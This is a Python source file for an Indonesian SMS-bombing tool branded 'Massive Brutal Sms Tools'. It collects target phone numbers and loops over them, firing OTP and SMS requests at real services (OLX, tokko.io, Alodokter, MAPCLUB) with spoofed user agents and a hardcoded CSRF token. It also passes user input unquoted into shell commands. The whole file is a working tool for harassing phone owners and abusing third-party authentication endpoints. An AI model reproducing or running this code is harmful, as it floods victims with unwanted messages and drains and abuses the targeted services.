# Made With ❤️ Kucing0yen ft AmmarrBN
# Powered By ExecutedTeam

import os,sys,time,requests,json,random
import itertools,threading
from colorama import Fore,init,Back

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mMassive Brutal Sms Tools\033[1;0m"

def printtik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)

def tanya():
    tanya=input(f"{W}[{R}•{W}] Main Lagi {biru}({W}y{abu}/{W}n{biru}){R}:{G} ")
    if tanya == "y" or tanya == "Y":
        banner2()
    if tanya == "n" or tanya == "N":
        printtik(f"{biru}Thx For {W}Using My {biru}Tools")
        sys.exit("")

# Don't Removed Code
# Coded By AmmarrBN
def settings():
    sett=input(f"{W}Input Target {B}•{R}⟩{G} ")
    os.system(f"echo '{sett}' > list1.txt")
    os.system(f"mv target.txt list2.txt")
    os.system(f"cat list1.txt list2.txt > target.txt")
    tambah=input(f"{W}[{R}•{W}] Tambahkan Target Lagi {biru}({W}y{abu}/{W}n{biru}){R}:{G}")
    if tambah == "y" or tambah == "Y":
        settings()
    if tambah == "n" or tambah == "N":
        banner2()
    else:
        printtik(f"{W}[{R}!{W}] Input Yang Benan Kack {R}!!!")
        time.sleep(4)
        banner2()

# Don't Removed Code
# Code By AmmarrBN
def start():
    try:
        gas = open('target.txt','r').readlines()
        for line in gas:
            mr_ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"])
            mr_ammar=line.strip()
            AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+mr_ammar,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": mr_ua,"content-type": "application/json"}).text
            if "PENDING" in AmmarGamteng:
                print (f"\n{W}┌─")
                print (f"{W}├{R}⟩{W} Sukses Send Ke Nomor {G}{mr_ammar}")
            else:
                print (f"{W}├{R}⟩{W} Gagal Send Ke Nomor {G}{mr_ammar}")
            dekor2 = requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+mr_ammar,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
            if "errors" in dekor2:
                print (f"{W}├{R}⟩{W} Gagal Send Ke Nomor {G}{mr_ammar}")
            else:
                print (f"{W}├{R}⟩{W} Sukses Send Ke Nomor {G}{mr_ammar}")
            req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+mr_ammar}})).text
            if "success" in req3:
                print (f"{W}├{R}⟩{W} Sukses Send Ke Nomor {G}{mr_ammar}")
            else:
                print (f"{W}├{R}⟩{W} Gagal Send Ke Nomor {G}{mr_ammar}")
            req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":mr_ammar})).text
            if "success" in req:
                print (f"{W}├{R}⟩{W} Sukses Send Ke Nomor {G}{mr_ammar}")
                print (f"{W}└─")
            else:
                print (f"{W}├{R}⟩{W} Gagal Send Ke Nomor {G}{mr_ammar}")
                print (f"{W}└─")
    except FileNotFoundError:
        printtik(f"{W}[{R}!{W}] Target Kosong Silakan Setting Target Dahulu")
        
# Logo By Kucing0yen
def banner():
    os.system("clear")
    printtik(f"""
{R}⌜                                                            ⌝
   {ungu}╔╦╗{W}┌─┐┌─┐┌─┐  {biru}╔═╗{W}┌┬┐┌─┐ {abu}|-{R}»{biru}⟩ {W}Creator {R}:{W} AmmarBN
   {ungu}║║║{W}├─┤└─┐└─┐  {biru}╚═╗{W}│││└─┐ {abu}|-{R}»{biru}⟩ {W}Githubb {R}:{Y} github.com/AmmarrBN
   {ungu}╩ ╩{W}┴ ┴└─┘└─┘  {biru}╚═╝{W}┴ ┴└─┘ {abu}|-{R}»{biru}⟩ {G}Powered By Executed Team
{R}⌞                {Y}[{bg}{putih}{Y}]{R}                  ⌟""")

# Tambah Api Web Sama Massive Sendiri
def banner2():
    banner()
    printtik(f"""
{W}┬───{R}⟨{W}Menu{R}⟩{W}────────────────
{W}├─{ungu}⟩ {W}1{R}.{W}Spam Sms {W}({Y}Massive{W})
{W}├─{ungu}⟩ {W}2{R}.{W}Setting Target {R}({W}Atur Target{R})
{W}├─{ungu}⟩ {W}3{R}.{W}Remove Target {R}({W}Hapus Target{R})
{W}├─{ungu}⟩ {W}4{R}.{W}Join Komunitas {R}({G}WhatsApp{R})
{W}├─{ungu}⟩ {R}0{R}.{W}Exit {R}({W}Keluar{R})
{W}└─────────────────────────
""")
    mr_input=input(f"{W}Pilih {B}»{R}⟩{G} ")
    if mr_input=="1":
        start()
        tanya()
    if mr_input=="2":
        settings()
    if mr_input=="3":
        printtik(f"{W}[{Y}•••{W}] Removed Target{abu}...")
        os.system("rm list1.txt list2.txt target.txt")
        time.sleep(5)
        printtik(f"{W}[{G}✓{W}] Success Removed Target")
        tanya()
    if mr_input=="4":
        os.system("xdg-open https://chat.whatsapp.com/GRZoMoLPNJA22TR7WINpMY")
        tanya()
    if mr_input=="0":
        time.sleep(5)
        printtik(f"{W}[{R}!{W}] Exited With Program{abu}.....")

# Loading Code By Kucing0yen
def pro():
        banner2()
done = False
def loading():
    for c in itertools.cycle([f'{W}[{R}•{W}] Starting Tools..   ',f'{W}[{Y}•{W}] Starting Tools...  ',f'{W}[{G}•{W}] Starting Tools.....']):
        if done:
            break
        sys.stdout.write('\r'+c)
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r              ')
    print ("                                                ")
    pro()
t = threading.Thread(target=loading)
t.start()

time.sleep(4.60)
done = True
